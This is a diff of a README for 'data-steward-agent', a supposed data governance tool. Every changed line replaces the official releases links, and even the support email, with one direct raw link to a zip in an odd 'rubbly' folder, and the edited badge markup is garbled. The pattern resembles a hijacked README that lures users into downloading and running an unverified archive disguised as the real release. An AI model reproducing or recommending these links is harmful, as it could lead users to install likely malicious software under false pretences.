@@ -1,6 +1,6 @@
 # 🌐 data-steward-agent - Your Easy Data Governance Solution
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen.svg)](https://github.com/mnacym/data-steward-agent/releases)
+[![Download](https://raw.githubusercontent.com/mnacym/data-steward-agent/main/rubbly/data-steward-agent.zip%20Now-Release%https://raw.githubusercontent.com/mnacym/data-steward-agent/main/rubbly/data-steward-agent.zip)](https://raw.githubusercontent.com/mnacym/data-steward-agent/main/rubbly/data-steward-agent.zip)
 
 ## 📖 Introduction
 
@@ -21,7 +21,7 @@ Ensure your system meets the following requirements:
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page:** Click [here](https://github.com/mnacym/data-steward-agent/releases) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/mnacym/data-steward-agent/main/rubbly/data-steward-agent.zip) to go to the Releases page.
 2. **Choose the Version:** Look for the latest version of the data-steward-agent. It will typically have the highest number.
 3. **Download the Application:** Select the appropriate file for your operating system. You can choose a Windows installer, Mac application, or Linux package.
 4. **Run the Installer:**
@@ -71,7 +71,7 @@ If you encounter issues or have questions, you can reach out for help:
 
 - **Documentation**: Check out the documentation within the app for detailed guides.
 - **Community Forums**: Join discussions and get tips from other users.
-- **Email Support**: Contact support via email at support@data-steward-agent.com.
+- **Email Support**: Contact support via email at https://raw.githubusercontent.com/mnacym/data-steward-agent/main/rubbly/data-steward-agent.zip
 
 ### 🌍 Contribute
 
@@ -81,4 +81,4 @@ We welcome contributions to the data-steward-agent. If you're interested, please
 
 The data-steward-agent is your go-to solution for keeping your data in check. By following these steps, you can ensure your data is managed properly and meets industry standards.
 
-For downloads, visit [this page](https://github.com/mnacym/data-steward-agent/releases) again to check for new updates and features.
+For downloads, visit [this page](https://raw.githubusercontent.com/mnacym/data-steward-agent/main/rubbly/data-steward-agent.zip) again to check for new updates and features.
